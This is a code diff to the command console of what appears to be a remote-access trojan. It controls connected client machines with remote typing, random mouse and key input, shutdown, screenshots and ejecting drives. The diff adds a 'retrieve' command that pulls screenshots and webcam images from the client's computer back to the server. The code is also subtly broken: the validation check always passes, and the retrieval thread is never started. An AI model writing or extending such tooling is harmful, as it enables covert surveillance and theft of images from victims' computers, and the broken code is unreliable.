@@ -65,7 +65,7 @@ public class ClientCommander implements Runnable
     private boolean commandValid(String command)
     {
         command = command.toLowerCase();
-        return command != null || command.equals("type") || command.equals("chaos") || command.equals("help") || command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
+        return command != null || command.equals("retrieve") || command.equals("type") || command.equals("chaos") || command.equals("help") || command.equals("count") || command.equals("online") || command.equals("eject") || command.equals("sound") || command.equals("shutdown") || command.equals("restart") || command.equals("screenshot") || command.equals("msg");
     }
 
     /**
@@ -120,6 +120,8 @@ public class ClientCommander implements Runnable
                 System.out.println("chaos will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\tchaos 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
             else if(command.equals("type"))
                 System.out.println("type will type the provided message on the clients computer.\nExample usage:\n\ttype 127.0.0.1 \"this is will get typed out\"");
+            else if(command.equals("retrieve"))
+                System.out.println("retrieve will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\tretrieve 127.0.0.1");
         }
     }
 
@@ -157,7 +159,7 @@ public class ClientCommander implements Runnable
             return;
         }
 
-        // One argument commands: eject, shutdown, reboot, screenshot
+        // One argument commands: eject, shutdown, reboot, screenshot, retrieve
         // e.g. eject 127.0.0.1
         String host = null;
         if(commandTokens.size() > 1)
@@ -176,6 +178,12 @@ public class ClientCommander implements Runnable
 
         if(!host.equals("all"))
             target.sendCommand(command); // send the cmd to the specified connected client
+
+        if(command.equals("retrieve"))
+        {
+            new Thread(new Retriever(target.getConnection()));
+            return;
+        }
 
         // Two argument commands: sound, type
         // e.g. sound 127.0.0.1 /path/to/sound/file
